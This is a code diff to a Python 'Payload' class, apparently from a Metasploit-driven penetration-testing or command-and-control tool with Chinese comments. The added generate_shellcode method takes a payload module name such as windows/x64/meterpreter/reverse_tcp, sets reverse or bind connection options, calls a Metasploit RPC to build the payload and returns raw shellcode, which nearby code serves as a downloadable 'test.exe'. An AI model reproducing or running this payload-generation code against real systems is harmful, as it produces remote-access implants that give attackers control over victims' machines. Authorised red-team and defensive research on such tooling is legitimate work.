@@ -230,4 +230,47 @@ class Payload(object):
         # response['Content-Disposition'] = f"{urlpart}{leftpart}"
         response["Content-Disposition"] = 'attachment;filename=test.exe'
         return response
-        # return byteresult
+
+    @staticmethod
+    def generate_shellcode(mname=None, opts=None):
+        # mname = windows/x64/meterpreter/reverse_tcp
+        # 正向或反向连接
+        if mname.find("reverse") > 0:
+            try:
+                opts.pop('RHOST')
+            except Exception as _:
+                pass
+        elif mname.find("bind") > 0:
+            try:
+                opts.pop('LHOST')
+            except Exception as _:
+                pass
+
+        # 处理OverrideRequestHost参数
+        if opts.get('OverrideRequestHost') is True:
+            opts["LHOST"] = opts['OverrideLHOST']
+            opts["LPORT"] = opts['OverrideLPORT']
+            opts['OverrideRequestHost'] = False
+
+        # EXTENSIONS参数
+        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
+            opts['EXTENSIONS'] = 'stdapi'
+
+        opts["Format"] = 'raw'
+        if "windows" in mname:
+            opts["Format"] = 'raw'
+        elif "linux" in mname:
+            opts["Format"] = 'raw'
+        elif "java" in mname:
+            opts["Format"] = 'jar'
+        elif "python" in mname:
+            opts["Format"] = 'py'
+        elif "php" in mname:
+            opts["Format"] = 'raw'
+
+        result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
+                                                   timeout=RPC_FRAMEWORK_API_REQ)
+        if result is None:
+            return result
+        byteresult = base64.b64decode(result.get('payload'))
+        return byteresult
